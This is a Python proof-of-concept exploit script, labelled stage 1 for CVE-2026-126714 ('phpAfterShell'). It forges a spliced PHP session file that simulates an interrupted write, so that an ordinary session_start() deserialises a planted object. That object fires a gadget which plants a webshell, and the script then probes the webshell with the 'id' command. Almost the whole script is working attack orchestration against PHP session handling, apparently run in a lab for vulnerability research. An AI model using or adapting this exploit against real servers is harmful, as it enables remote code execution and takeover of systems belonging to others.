#!/usr/bin/env python3
"""
Stage 1 - deterministic storage-state POC for CVE-2026-126714 (phpAfterShell).

Reproduces the exact on-disk state an interrupted pwrite() leaves behind
(R[0:k] || C[k:]), then shows that an ordinary session_start() on a later
request promotes the planted bytes into a live object.

Steps:
  1. carrier upload-progress request (held)      -> progress record on disk
  2. ordinary app POST stores the bio payload    -> C = [progress][bio]
  3. dry-run replacement (no interruption)       -> R = [progress'][bio]
  4. verify predicted offsets against real bytes
  5. write mix = R[:k] || C[k:] (simulates the interrupted pwrite)
  6. consumer GET -> session_start() must yield the evil stdClass

This stage simulates the kernel interruption deterministically; stage2
performs the interruption for real via an OOM kill during pwrite().
"""
from __future__ import annotations

import sys
import time

import lab


def main() -> int:
    print("[*] restarting victim for a clean state")
    lab.restart_victim()

    sid = lab.sid_new()
    print(f"[*] sid = {sid}")

    # --- 1. carrier: progress record, request held open -------------------
    carrier_sock, carrier_port = lab.carrier_hold(sid)
    time.sleep(0.6)
    c0 = lab.sess_read(sid)
    if not c0.startswith(b"upload_progress_"):
        print(f"[!] carrier progress record missing: {c0[:80]!r}")
        return 1
    pc = len(c0)
    print(f"[+] C0 progress record: {pc} bytes")

    # --- 2. bio payload computed from predicted R geometry ----------------
    bio_hdr = f's:{"bio"}'.encode()  # placeholder, exact hdr built below
    l1_digits = len(str(lab.L1))
    p_start = pc + len(b"bio|s:") + l1_digits + len(':"')
    e_off = lab.e_offset()
    print(f"[*] predicted f={lab.f_offset()} E'={e_off} p_start={p_start}")
    if e_off <= p_start:
        print("[!] E' inside progress record - geometry broken")
        return 1

    payload = lab.build_payload(p_start, e_off)
    print(f"[*] bio payload: {len(payload)} bytes "
          f"(plant at payload offset {e_off - p_start})")

    # --- 3. store bio -> C ------------------------------------------------
    lab.store_bio(sid, payload)
    time.sleep(0.3)
    c = lab.sess_read(sid)
    try:
        lab.verify_c(c, p_start, e_off, payload)
    except AssertionError as e:
        print(f"[!] C verification failed: {e}")
        print(f"    |C|={len(c)} head={c[:120]!r}")
        return 1
    print(f"[+] C verified: |C|={len(c)} = [progress {pc}][bio {lab.L1 + l1_digits + 8}]")

    # --- 4. dry-run replacement -> R --------------------------------------
    repl_sock, repl_port = lab.replacement_hold(sid)
    time.sleep(1.0)
    r = lab.sess_read(sid)
    if not r.startswith(b"upload_progress_"):
        print(f"[!] replacement did not write R: {r[:80]!r}")
        return 1

    # calibrate bp: extract actual bytes_processed from R
    import re
    m = re.search(rb's:15:"bytes_processed";i:(\d+);', r)
    actual_bp = int(m.group(1)) if m else -1
    print(f"[*] R bytes_processed at file-start: actual={actual_bp} "
          f"(digits={len(str(actual_bp))}; f depends only on digit count)")
    if len(str(actual_bp)) != 7:
        print("[!] bp digit count != 7 -> f prediction must be recalibrated")

    try:
        f_actual, e_actual = lab.verify_r(r, c)
    except AssertionError as e:
        print(f"[!] R verification failed: {e}")
        print(f"    |R|={len(r)} head={r[:160]!r}")
        return 1
    print(f"[+] R verified: |R|={len(r)} f={f_actual} E'={e_actual} "
          f"(window {e_actual - f_actual} bytes)")

    # --- 5. splice (the interrupted-pwrite state) -------------------------
    k = lab.pick_k(f_actual, e_actual)
    mix = lab.splice(c, r, k)
    assert len(mix) == len(c)
    lab.sess_write(sid, mix)
    print(f"[+] wrote mix = R[:{k}] || C[{k}:] ({len(mix)} bytes)")

    # --- 6. consumer: ordinary session_start() ----------------------------
    # decode debug: run PHP's own decoder on the mix file
    dbg = lab.sh(
        f"php -r 'session_start(); "
        f"$r=session_decode(file_get_contents(\"/tmp/sess_{sid}\")); "
        f"fwrite(STDERR, \"decode=\".var_export($r,true).\"\\n\"); "
        f"foreach($_SESSION as $k=>$v) fwrite(STDERR, \"$k => \".get_debug_type($v).\"\\n\");' "
        f"2>&1 | tail -8")
    print(f"[*] php-cli decode debug:\n{dbg}")

    # raw consumer response (keeps warnings)
    req = (f"GET /index.php HTTP/1.1\r\nHost: localhost\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    _, raw = lab._http(lab.PORT, req, read_resp=True, timeout=15)
    body = raw.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in raw else raw
    print(f"[*] consumer raw ({len(body)} bytes): {body[:600]!r}")

    print(f"[*] consumer body: {body[:300]!r}")

    # Verdict WITHOUT any target-side report: the consumer request above
    # fired the gadget, so the webshell on disk IS the proof - probe it.
    shell_out = lab.probe_shell(lab.PORT, "id")
    ok = bool(shell_out)
    if ok:
        print(f"[+] HIT: webshell answered -> {shell_out!r}")

    # save artifacts
    import os
    results_dir = os.path.join(lab.BASE, "results")
    os.makedirs(results_dir, exist_ok=True)
    with open(os.path.join(results_dir, f"stage1_sid_{sid[:8]}.txt"), "w") as f:
        f.write(f"sid={sid}\nk={k}\nf={f_actual}\ne={e_actual}\n"
                f"|C|={len(c)} |R|={len(r)} |mix|={len(mix)}\n"
                f"actual_bp={actual_bp}\n"
                f"probe={shell_out!r}\n")

    for s in (carrier_sock, repl_sock):
        try:
            s.close()
        except OSError:
            pass

    if ok:
        print("\n=== STAGE1 RESULT: PASS (object injection via spliced session) ===")
        return 0
    print("\n=== STAGE1 RESULT: FAIL ===")
    return 2


if __name__ == "__main__":
    sys.exit(main())
